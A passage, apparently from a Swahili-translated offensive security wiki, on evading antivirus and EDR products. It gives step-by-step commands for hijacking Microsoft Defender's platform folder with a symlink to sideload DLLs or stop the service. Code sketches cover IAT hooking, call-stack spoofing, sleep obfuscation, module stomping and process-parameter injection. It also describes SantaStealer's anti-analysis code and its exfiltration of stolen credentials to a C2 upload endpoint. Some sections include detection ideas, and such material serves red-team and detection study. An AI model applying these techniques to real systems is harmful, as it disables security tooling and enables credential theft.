- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoashiria binary corruption.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazohifadhi security tooling ikiwa inaendana na environment yako (ifanyie test kwa kina).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform ambayo itaendesha kwa ku-enumerate subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye lexicographic version string ya juu zaidi (kwa mfano, `4.18.25070.5-0`), kisha huanzisha Defender service processes kutoka hapo (ikisasisha service/registry paths ipasavyo). Uchaguzi huu huamini directory entries, ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye attacker-writable path na kufanikisha DLL sideloading au service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kusababisha Defender platform re-selection (service restart wakati wa boot)
- Built-in tools pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia writes kwenye folders zake, lakini platform selection yake huamini directory entries na kuchagua version ya juu zaidi kwa lexicographic order bila kuthibitisha kwamba target inaelekeza kwenye protected/trusted path.

Hatua kwa hatua (mfano)
1) Andaa writable clone ya platform folder ya sasa, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye path iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kufuatilia process path mpya chini ya `C:\TMP\AV\` na service configuration/registry inayoonyesha eneo hilo.

Chaguo za Post-exploitation
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka application directory yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa start inayofuata path iliyosanidiwa isitafsiriwe, na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya API surface ndogo inayotolewa na kits nyingi (kwa mfano, CreateProcessA), na inaweka protections hizo hizo kwenye BOFs na post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Njia ya kiwango cha juu
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mbele au companion). PIC lazima iwe self‑contained na position‑independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na u-patch IAT entries za targeted imports (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) zielekeze kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya tail-calling real API address. Evasions za kawaida zinajumuisha:
- Memory mask/unmask kuzunguka call (kwa mfano, encrypt beacon regions, RWX→RX, kubadilisha page names/permissions), kisha kurejesha hali baada ya call.
- Call-stack spoofing: tengeneza stack isiyo na mashaka na ufanye transition kwenda kwenye target API ili call-stack analysis itafsiri kuwa frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa compatibility, export interface ili Aggressor script (au equivalent) iweze kusajili APIs zitakazohookiwa kwa Beacon, BOFs na post‑ex DLLs.

Kwa nini IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia hooked import, bila kurekebisha tool code au kutegemea Beacon ku-proxy APIs maalum.
- Hufunika post‑ex DLLs: ku-hook LoadLibrary* hukuwezesha ku-intercept module loads (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya post‑ex commands za ku-spawn processes dhidi ya detections zinazotegemea call-stack kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na PIC-safe; resolve API halisi kupitia thamani ya awali ya IAT uliyohifadhi kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha pages zikiwa writable+executable.

Stub ya call-stack spoofing
- PIC stubs za mtindo wa Draugr huunda call chain bandia (return addresses ndani ya modules zisizo na mashaka), kisha pivot kwenda kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Oanisha na mbinu za stack cutting/stack stitching ili kutua ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianzishe kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi kutokana na njia ileile ya evasion bila mabadiliko ya code.

Mambo ya kuzingatia katika Detection/DFIR
- Uadilifu wa IAT: entries zinazo-resolve kwenda kwenye anwani za non-image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za stack: return addresses zisizomilikiwa na images zilizopakiwa; mabadiliko ya ghafla kwenda non-image PIC; ukoo wa RtlUserThreadStart usio thabiti.
- Telemetry ya loader: writes za ndani ya process kwenda kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa load.
- Image-load evasion: ikiwa unahook LoadLibrary*, fuatilia loads zenye mashaka za automation/clr assemblies zinazoambatana na matukio ya memory masking.

Vipengele vya ujenzi vinavyohusiana na mifano
- Reflective loaders zinazofanya IAT patching wakati wa load (mfano, TitanLdr, AceLdr)
- Memory masking hooks (mfano, simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (mfano, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO resident

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Jenga **PICO resident** (persistent PIC object) inayosalia baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayofuta upya resolver ya imports ya loader (mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Ndani ya `_GetProcAddress`, ruka ordinal imports na utumie hook lookup inayotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; vinginevyo delegate kwa `GetProcAddress` halisi.
- Sajili hook targets wakati wa link kwa Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook hubaki valid kwa sababu iko ndani ya PICO resident.

Hii huleta **import-time IAT redirection** bila kupatch code section ya DLL iliyopakiwa baada ya load.

### Kulazimisha imports zinazoweza ku-hookiwa wakati target inatumia PEB-walking

Import-time hooks hufanya kazi tu ikiwa function iko kweli kwenye IAT ya target. Ikiwa module inaresolve APIs kupitia PEB-walk + hash (bila import entry), force import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha hashed export resolution (mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na reference ya moja kwa moja kama `&WaitForSingleObject`.
- Compiler itatoa IAT entry, kuwezesha interception wakati reflective loader inaresolve imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kupatch `Sleep()`

Badala ya kupatch `Sleep`, hook **wait/IPC primitives** halisi ambazo implant inatumia (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga call ndani ya obfuscation chain ya mtindo wa Ekko inayosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizoundwa.
- Chain ya kawaida (x64): weka image kuwa `PAGE_READWRITE` → RC4 encrypt kupitia `advapi32!SystemFunction032` juu ya image yote iliyomapped → fanya blocking wait → RC4 decrypt → **rejesha permissions za kila section** kwa kutembea kwenye PE sections → signal completion.
- `RtlCaptureContext` hutoa template ya `CONTEXT`; i-clone katika frames nyingi na uweke registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (mfano, `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Pattern hii huficha module dhidi ya scanners wakati wa idle windows na huepuka signature ya kawaida ya “patched `Sleep()`”.

Mawazo ya Detection (yanayotegemea telemetry)
- Milipuko ya `CreateTimerQueueTimer` callbacks zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` ikitumika kwenye buffers kubwa zinazofuatana zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa permissions za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zenye CFG, indirect jump ya kwanza kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha process ku-crash ikiwa na `STATUS_STACK_BUFFER_OVERRUN`, kwa sababu gadget haipo kwenye CFG metadata ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikiendelea ndani ya processes zilizo-hardening:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **ukubwa wote wa image**.
- Kwa maeneo yaliyomanually mapped/PIC/stomped, tumia **allocation base** na allocation size badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia exports zinazofikiwa indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na executable sections zozote zinazodhibitiwa na attacker ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompile kwa `/guard:cf`.

### CET-safe stack spoofing kwa threads zinazolala

Full `CONTEXT` replacement inaonekana kwa urahisi na inaweza kuharibika kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyospoofiwa lazima bado ikubaliane na hardware shadow stack. Pattern salama zaidi ya sleep-masking ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine katika process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Capture context halisi ya thread inayolala kwa `GetThreadContext`.
- Copy **`Rip` halisi pekee** ndani ya spoof context, ukiacha `Rsp`/stack state iliyospoofiwa bila kubadilishwa.
- Wakati wa sleep window, copy `NT_TIB` ya spoof thread ndani ya TEB ya sasa ili stack walkers zi-unwind ndani ya legitimate stack range.
- Baada ya wait kwisha, rejesha TIB ya awali na thread context.

Hii huhifadhi instruction pointer inayolingana na CET huku ikiwarekebisha EDR stack walkers wanaotegemea TEB stack metadata kuthibitisha unwinds.

### Njia mbadala inayotegemea APC: Kraken Mask

Ikiwa timer-queue dispatch ina signatures nyingi sana, mfuatano uleule wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka helper thread iliyosuspendiwa kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Queue `CONTEXT` frames/APCs zilizoandaliwa kwa `NtQueueApcThread` na uzimalize kwa `NtAlertResumeThread`.
- Hifadhi chain state kwenye heap badala ya helper stack ili kuepuka kujaa kwa default 64 KB thread stack.
- Tumia `NtSignalAndWaitForSingleObject` kusignal start event atomically na ku-block.
- Suspend main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza race window ambapo scanner inaweza kukamata stack iliyorejeshwa nusu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` kuwa signature ya helper-thread/APC huku ikihifadhi malengo yale yale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya Detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` iliyofungwa kuzunguka `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia indirectly `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha section-permission.
- Matumizi ya kurudiwa ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya signed modules.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka **`.text` section ya DLL ambayo tayari ime-mapped ndani ya target process** badala ya kutenga private executable memory inayoonekana wazi au kupakia sacrificial DLL mpya. Target ya overwrite inapaswa kuwa **image iliyopakiwa na inayoungwa mkono na disk**, ambayo code space yake inaweza kubeba payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Uchaguzi wa target unaotegemeka

Stomping ya kizembe dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: DLL inaweza isiwe imepakiwa kwenye remote process, na code region ndogo sana itasababisha process ku-crash. Workflow inayotegemeka zaidi ni:

1. Enumerate modules za target process na uhifadhi **names-only include list** ya DLLs ambazo tayari zimepakiwa.
2. Jenga payload kwanza na urekodi **byte size yake kamili**.
3. Scan candidate DLLs kwenye disk na linganisha PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko file size kwa sababu linaonyesha ukubwa wa executable section **inapomapped kwenye memory**.
4. Parse **Export Address Table (EAT)** na uchague function RVA iliyokuwa exported kama stomp start offset.
5. Hesabu **blast radius**: ikiwa payload inazidi boundary ya function iliyochaguliwa, ita-overwrite exports zilizo karibu ambazo zimepangwa baada yake kwenye memory.

Recon/selection helpers za kawaida zinazoonekana in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Maelezo ya uendeshaji
- Pendelea DLLs **zilizopakiwa tayari** katika remote process ili kuepuka telemetry ya `LoadLibrary`/image loads zisizotarajiwa.
- Pendelea exports ambazo hutekelezwa mara chache na target application; la sivyo, code paths za kawaida zinaweza kufikia bytes zilizostomp kabla au baada ya thread kuundwa.
- Implants kubwa mara nyingi huhitaji kubadilisha shellcode embedding kutoka string literal hadi **byte-array/braced initializer** ili buffer kamili iwakilishwe ipasavyo katika injector source.

Mawazo ya detection
- Remote writes zinazoelekezwa kwenye **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya private RWX/RX allocations zinazotumika mara nyingi.
- Export entry points ambazo bytes zake zilizo kwenye memory hazilingani tena na backing file iliyo kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export ambayo bytes zake za mwanzo zilibadilishwa hivi karibuni.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya DLL `.text` pages, ukifuatiwa na thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa remote write path ya kawaida (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target inayoendelea kufanya kazi, hutumia ukweli kwamba Windows **inakili startup parameters zilizochaguliwa za `CreateProcessW` kwenye child process** na kuzihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Carriers muhimu ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (with `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya vitendo kwa carriers:

- `lpCommandLine` lazima ielekeze kwenye writable memory kwa ajili ya `CreateProcessW`, na ina kikomo cha **32,767 Unicode characters**, ikijumuisha null terminator.
- `lpEnvironment` lazima iwe Unicode environment block yenye strings zinazofuatana za `NAME=VALUE\0`, ikifuatiwa na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama implementation detail badala ya contract thabiti iliyo documented.

Hii hubadilisha process creation ya kawaida kuwa **payload-transfer primitive**. Operator huunda child process kwa startup data inayodhibitiwa na attacker na kuiacha Windows ifanye cross-process copy.

### Remote lookup flow without remote write APIs

Baada ya child kuundwa, resolve buffer iliyonakiliwa kwa kutumia primitives za **read-only**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. P3 chain ya kawaida ni:

1. Unda process kwa kawaida (bila kuiweka suspended)
2. Fanya ukurasa wa parameter uliochaguliwa uwe executable kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena main thread handle ambayo tayari imerudishwa katika `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye returned main thread handle.

Hii huepuka APIs kadhaa zinazofuatiliwa kwa kawaida kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kikomo cha null-byte na staged shellcode

Carriers zote tatu ni **data ya string au inayofanana na string**, hivyo raw payload yenye `0x00` hukatizwa wakati wa transfer. Workaround ya vitendo ni **first stage isiyo na null** ambayo huunda upya constants wakati wa runtime, kisha hupakia second stage ya aina yoyote.

Pattern rahisi ni XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Hii huruhusu first stage kujenga stack strings, API arguments, DLL paths, au second-stage shellcode loader bila ku-embed null bytes kwenye parameter inayosafirishwa.

### Stack-based API calls kutoka first stage

Wakati first stage inapaswa kuita APIs kama `LoadLibraryA`, inaweza:

- ku-push string/buffer kwenye target stack
- kuhifadhi **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` iko **16-byte aligned** kabla ya call

Second stage inaweza kunakiliwa kutoka stack kwenda kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa kutumia `VirtualProtect`, kisha kurukiwa, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Detection ideas

Fursa nzuri za hunting zilizotajwa na authors:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kufanya **process-parameter pages executable**
- mabadiliko hayo ya protection yakifuatwa na `SetThreadContext` / `NtSetContextThread`
- remote reads za `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy kubwa wakati wa kuunda process

### Notes

- P3 ni **cross-process transfer trick**, si full execution primitive yenyewe: parameter iliyonakiliwa bado inahitaji execute-permission change na execution redirection method.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na authors lakini ikakataliwa kwa sababu internally hufikia primitives zenye mashaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## SantaStealer Tradecraft kwa Fileless Evasion na Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyochanganya AV bypass, anti-analysis na credential access katika workflow moja.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) huorodhesha keyboard layouts zilizowekwa kwa kutumia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout itapatikana, sample huunda marker tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha hailipuki kamwe kwenye locales zilizotengwa huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya michakato, huhash kila jina kwa kutumia rolling checksum maalum, na kulinganisha matokeo dhidi ya blocklist zilizowekwa ndani za debuggers/sandboxes; hurudia checksum hiyo kwa jina la kompyuta na hukagua working directories kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kikomo cha chini cha idadi ya michakato, uptime ya hivi karibuni), huita `OpenServiceA("VBoxGuest")` ili kugundua nyongeza za VirtualBox, na hufanya ukaguzi wa muda karibu na sleeps ili kugundua single-stepping. Hit yoyote husitisha utekelezaji kabla ya modules kuanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- DLL/EXE kuu inaweka ndani yake Chromium credential helper ambayo aidha huandikwa kwenye diski au hu-map manually kwenye memory; katika fileless mode, imports/relocations hutatuliwa yenyewe ili hakuna helper artifacts zinazoandikwa.
- Helper hiyo huhifadhi DLL ya second-stage iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya passes zote mbili, hu-load blob reflectively (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ku-inject kwenye Chromium browser inayotumika, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka kwenye SQLite databases licha ya ABE hardening.


### Ukusanyaji wa modular in-memory & chunked HTTP exfil

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na kuanzisha thread moja kwa kila module iliyowashwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti file count yake baada ya join window ya takriban sekunde 45.
- Baada ya kukamilika, kila kitu huwekwa kwenye zip kwa kutumia library ya `miniz` iliyolinkiwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive kwa streams za vipande vya MB 10 kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku ikijifanya kuwa browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa reassembly imekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Usumbaji sahihi wa modules](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena pasi za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Infection Chain mpya na obfuscation inayotegemea ConfuserEx ya DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kupita ukaguzi wa posture wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza shughuli za awali za ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports ya Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa Dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa michakato na access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDRs kwa kutumia Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja protective shell ya Windows Defender kwa kutumia Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pure Curtain: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Town: Infostealer mpya yenye malengo makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Node.js Malware kwa API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
